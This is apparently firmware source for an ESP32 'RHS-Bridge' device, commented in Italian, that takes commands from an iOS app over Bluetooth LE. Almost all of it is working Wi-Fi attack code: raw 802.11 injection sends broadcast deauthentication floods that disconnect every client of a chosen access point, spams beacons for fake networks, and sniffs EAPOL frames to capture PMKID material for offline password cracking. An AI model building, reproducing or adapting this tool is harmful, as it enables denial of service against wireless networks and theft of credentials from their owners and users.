// RedHatSec Bridge — firmware ESP32 (Arduino core)
// Ponte radio BLE per l'app iOS RedHatSec: scan Wi-Fi, deauth, beacon spam, PMKID.
//
// == Protocollo RHS (spec condivisa con l'app) ==
//   TX app->esp: [0xA5][len:u16 LE][seq:u8][cmd:u8][payload][crc8]
//   RX esp->app: [0x5A][len:u16 LE][seq=cmd richiesto][status:u8][payload][crc8]
//   crc8 poly 0x07, calcolato su [len..payload] (esclude lo START byte)
//   cmd: 01 ping | 02 scan(sec) | 04 deauth(mac6,ch,count) | 05 beacon(count,[len][ssid]..)
//        06 pmkid(mac6,ch) | 07 stop
//   payload scan: [rssi:i8][ch:u8][bssid:6][sec:u8][ssidLen:u8][ssid..] x N
//
// == Flash ==
//   Arduino IDE → Boards Manager → "esp32 by Espressif Systems" →
//   Board: ESP32 Dev Module → Upload (tieni premuto BOOT se serve)

#include <WiFi.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>

#define SVC_UUID "0000FFE0-0000-1000-8000-00805F9B34FB"
#define CHR_UUID "0000FFE1-0000-1000-8000-00805F9B34FB"
#define DEVICE_NAME "RHS-Bridge"

BLECharacteristic *pCharOut;
BLEServer *pServer;

uint8_t rxBuf[512];
int rxLen = 0;

// stato attacchi
volatile bool beaconActive = false;
volatile bool pmkidArmed = false;
uint32_t pmkidStart = 0;
uint8_t pmkidTarget[6];
uint8_t pmkidBuf[128];
int pmkidLen = 0;
bool pmkidCaptured = false;
uint8_t scanSeconds = 6;
bool scanRequested = false;

uint8_t beaconSsids[16][33];
int beaconSsidLens[16];
int beaconCount = 0;

// ===== crc8 =====
uint8_t crc8(const uint8_t *d, int n) {
  uint8_t crc = 0;
  for (int i = 0; i < n; i++) {
    crc ^= d[i];
    for (int b = 0; b < 8; b++)
      crc = (crc & 0x80) ? (uint8_t)((crc << 1) ^ 0x07) : (uint8_t)(crc << 1);
  }
  return crc;
}

// ===== TX verso l'app (chunked notify, MTU-safe) =====
void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len) {
  if (!pCharOut) return;
  uint8_t f[512];
  int i = 0;
  f[i++] = 0x5A;
  f[i++] = len & 0xFF;
  f[i++] = (len >> 8) & 0xFF;
  f[i++] = cmdEcho;
  f[i++] = status;
  if (len > 0) { memcpy(f + i, payload, len); i += len; }
  f[i++] = crc8(f + 1, 4 + len);
  int off = 0;
  while (off < i) {
    int c = min(20, i - off);
    pCharOut->setValue(f + off, c);
    pCharOut->notify();
    delay(12);
    off += c;
  }
  Serial.printf("[TX] cmd=0x%02X status=0x%02X len=%d\n", cmdEcho, status, len);
}

// ===== RX dall'app =====
void feedRx(const uint8_t *d, int n) {
  for (int i = 0; i < n; i++) {
    if (rxLen == 0 && d[i] != 0xA5) continue;
    if (rxLen < (int)sizeof(rxBuf)) rxBuf[rxLen++] = d[i];
    if (rxLen >= 6) {
      int plen = rxBuf[1] | (rxBuf[2] << 8);
      int total = 6 + plen;
      if (rxLen >= total) {
        uint8_t cmd = rxBuf[4];
        if (crc8(rxBuf + 1, 4 + plen) == rxBuf[5 + plen]) {
          dispatchCmd(cmd, rxBuf + 5, plen);
        } else {
          sendFrame(cmd, 0x01, (const uint8_t *)"crcerr", 6);
        }
        rxLen = 0;
      }
    }
  }
}

// ===== 802.11 raw =====
void enterAttackMode(uint8_t ch) {
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void exitAttackMode() {
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_MODE_NULL);
  WiFi.mode(WIFI_MODE_STA);
}

void sendDeauth(const uint8_t bssid[6], uint8_t ch, int count) {
  enterAttackMode(ch);
  uint8_t pkt[26];
  pkt[0] = 0xC0; pkt[1] = 0x00;              // frame control: deauth
  pkt[2] = 0x00; pkt[3] = 0x00;              // duration
  for (int k = 0; k < 6; k++) pkt[4 + k] = 0xFF;  // dst = broadcast (tutti i client)
  memcpy(pkt + 10, bssid, 6);                // src
  memcpy(pkt + 16, bssid, 6);                // bssid
  pkt[22] = 0xF0; pkt[23] = 0xFF;            // seq
  pkt[24] = 0x07; pkt[25] = 0x00;            // reason 7: class 3 da non associato
  for (int n = 0; n < count; n++) {
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
    delay(8);
  }
  exitAttackMode();
  Serial.printf("[deauth] %02X:%02X:%02X:%02X:%02X:%02X ch%d x%d\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ch, count);
}

void buildBeacon(uint8_t *pkt, int *len, const uint8_t *ssid, int ssidLen,
                 const uint8_t bssid[6], uint8_t ch) {
  int i = 0;
  pkt[i++] = 0x80; pkt[i++] = 0x00;          // beacon
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  for (int k = 0; k < 6; k++) pkt[i++] = 0xFF;
  memcpy(pkt + i, bssid, 6); i += 6;
  memcpy(pkt + i, bssid, 6); i += 6;
  pkt[i++] = 0x00; pkt[i++] = 0x00;
  for (int k = 0; k < 8; k++) pkt[i++] = 0x00;  // timestamp
  pkt[i++] = 0x64; pkt[i++] = 0x00;          // beacon interval 100 TU
  pkt[i++] = 0x01; pkt[i++] = 0x04;          // capability: ESS
  pkt[i++] = 0x00; pkt[i++] = (uint8_t)ssidLen;  // SSID IE
  memcpy(pkt + i, ssid, ssidLen); i += ssidLen;
  pkt[i++] = 0x01; pkt[i++] = 0x08;          // supported rates IE
  const uint8_t rates[8] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  memcpy(pkt + i, rates, 8); i += 8;
  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = ch;  // DS param (canale)
  *len = i;
}

void beaconLoop() {
  uint8_t ch = 6;
  enterAttackMode(ch);
  uint8_t pkt[128];
  for (int n = 0; n < beaconCount && beaconActive; n++) {
    uint8_t bssid[6] = {0x02, (uint8_t)random(256), (uint8_t)random(256),
                        (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)};
    int len = 0;
    buildBeacon(pkt, &len, beaconSsids[n], beaconSsidLens[n], bssid, ch);
    for (int rep = 0; rep < 3; rep++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, len, false);
    delay(40);
  }
  exitAttackMode();
}

// ===== PMKID sniffer =====
void snifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!pmkidArmed || type != WIFI_PKT_DATA) return;
  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *d = p->payload;
  int len = p->rx_ctrl.sig_len;
  if (len < 40 || len > 200) return;
  // LLC/SNAP: AA AA 03 00 00 00 88 8E (EAPOL)
  if (d[24] != 0xAA || d[25] != 0xAA || d[26] != 0x03 || d[27] != 0x00 ||
      d[28] != 0x00 || d[29] != 0x00 || d[30] != 0x88 || d[31] != 0x8E) return;
  // filtro: AP = mac addr2 (frame data: addr1 dst, addr2 src/AP)
  if (memcmp(d + 10, pmkidTarget, 6) != 0) return;
  pmkidLen = min(len, 128);
  memcpy(pmkidBuf, d, pmkidLen);
  pmkidCaptured = true;
  Serial.println("[pmkid] EAPOL catturato");
}

// ===== dispatcher comandi =====
void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
  Serial.printf("[RX] cmd=0x%02X plen=%d\n", cmd, plen);
  switch (cmd) {
    case 0x01:  // ping
      sendFrame(0x01, 0x00, (const uint8_t *)"RHS-BRIDGE", 10);
      break;
    case 0x02:  // scan
      beaconActive = false;
      scanSeconds = plen > 0 ? pl[0] : 6;
      scanRequested = true;  // eseguita in loop() (non blocca la BLE task)
      break;
    case 0x04:  // deauth(mac6, ch, count)
      if (plen >= 8) {
        beaconActive = false;
        sendDeauth(pl, pl[6], pl[7]);
        sendFrame(0x04, 0x00, (const uint8_t *)"deauth ok", 9);
      } else {
        sendFrame(0x04, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;
    case 0x05: {  // beacon(count, [len][ssid]..)
      beaconActive = false;
      int p = 0;
      int cnt = plen > 0 ? pl[p++] : 0;
      if (cnt > 16) cnt = 16;
      beaconCount = 0;
      for (int k = 0; k < cnt && p < plen; k++) {
        int sl = pl[p++];
        if (p + sl > plen || sl > 32) break;
        memcpy(beaconSsids[beaconCount], pl + p, sl);
        beaconSsidLens[beaconCount] = sl;
        beaconCount++;
        p += sl;
      }
      beaconActive = true;  // eseguito in loop()
      Serial.printf("[beacon] armato x%d\n", beaconCount);
      break;
    }
    case 0x06:  // pmkid(mac6, ch)
      if (plen >= 7) {
        memcpy(pmkidTarget, pl, 6);
        pmkidCaptured = false;
        pmkidLen = 0;
        pmkidArmed = true;
        pmkidStart = millis();
        WiFi.mode(WIFI_MODE_STA);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(snifferCb);
        esp_wifi_set_channel(pl[6], WIFI_SECOND_CHAN_NONE);
        Serial.println("[pmkid] armed");
      }
      break;
    case 0x07:  // stop
      beaconActive = false;
      pmkidArmed = false;
      exitAttackMode();
      sendFrame(0x07, 0x00, (const uint8_t *)"stopped", 7);
      break;
    default:
      sendFrame(cmd, 0x03, (const uint8_t *)"unknown cmd", 11);
  }
}

// ===== scan =====
void doScan() {
  WiFi.mode(WIFI_MODE_STA);
  delay(100);
  int n = WiFi.scanNetworks(false, true);
  uint8_t payload[900];
  int i = 0;
  for (int k = 0; k < n && i < 880; k++) {
    String ssid = WiFi.SSID(k);
    int32_t rssi = WiFi.RSSI(k);
    uint8_t ch = WiFi.channel(k);
    uint8_t *b = WiFi.BSSID(k);
    uint8_t sec = WiFi.encryptionType(k) == WIFI_AUTH_OPEN ? 0 : 1;
    payload[i++] = (uint8_t)(int8_t)constrain(rssi, -100, -30);
    payload[i++] = ch;
    memcpy(payload + i, b, 6); i += 6;
    payload[i++] = sec;
    int sl = min(32, (int)ssid.length());
    payload[i++] = (uint8_t)sl;
    memcpy(payload + i, ssid.c_str(), sl); i += sl;
  }
  WiFi.scanDelete();
  sendFrame(0x02, 0x00, payload, i);
  Serial.printf("[scan] %d reti\n", n);
}

// ===== BLE callbacks =====
class InCallbacks : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic *c) override {
    String v = c->getValue();
    if (v.length() == 0) return;
    feedRx((const uint8_t *)v.c_str(), v.length());
  }
};

class SrvCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer *s) override { Serial.println("[BLE] client connesso"); }
  void onDisconnect(BLEServer *s) override {
    Serial.println("[BLE] client disconnesso — riavvio advertising");
    beaconActive = false;
    pmkidArmed = false;
    BLEDevice::startAdvertising();
  }
};

void setup() {
  Serial.begin(115200);
  pinMode(2, OUTPUT);

  BLEDevice::init(DEVICE_NAME);
  BLEServer *srv = BLEDevice::createServer();
  pServer = srv;
  srv->setCallbacks(new SrvCallbacks());
  BLEService *svc = srv->createService(SVC_UUID);
  // FFE1 unica characteristic: l'app scrive qui e riceve le notify da qui
  pCharOut = svc->createCharacteristic(CHR_UUID,
                                       BLECharacteristic::PROPERTY_READ |
                                       BLECharacteristic::PROPERTY_WRITE |
                                       BLECharacteristic::PROPERTY_NOTIFY);
  pCharOut->addDescriptor(new BLE2902());
  pCharOut->setCallbacks(new InCallbacks());
  svc->start();
  BLEAdvertising *adv = BLEDevice::getAdvertising();
  adv->addServiceUUID(SVC_UUID);
  adv->setScanResponse(true);
  BLEDevice::startAdvertising();
  Serial.println("[RHS-Bridge] pronto — advertising BLE attivo");
}

void loop() {
  digitalWrite(2, beaconActive ? (millis() / 100) % 2 : LOW);

  if (scanRequested) {
    scanRequested = false;
    doScan();
  }

  if (beaconActive) {
    beaconLoop();
    if (!beaconActive) {} // fermato via stop
  }

  // pmkid: timeout 25s
  if (pmkidArmed && (pmkidCaptured || millis() - pmkidStart > 25000)) {
    pmkidArmed = false;
    exitAttackMode();
    if (pmkidCaptured) {
      sendFrame(0x06, 0x00, pmkidBuf, pmkidLen);
    } else {
      sendFrame(0x06, 0x02, (const uint8_t *)"no eapol", 8);
    }
  }

  delay(10);
}
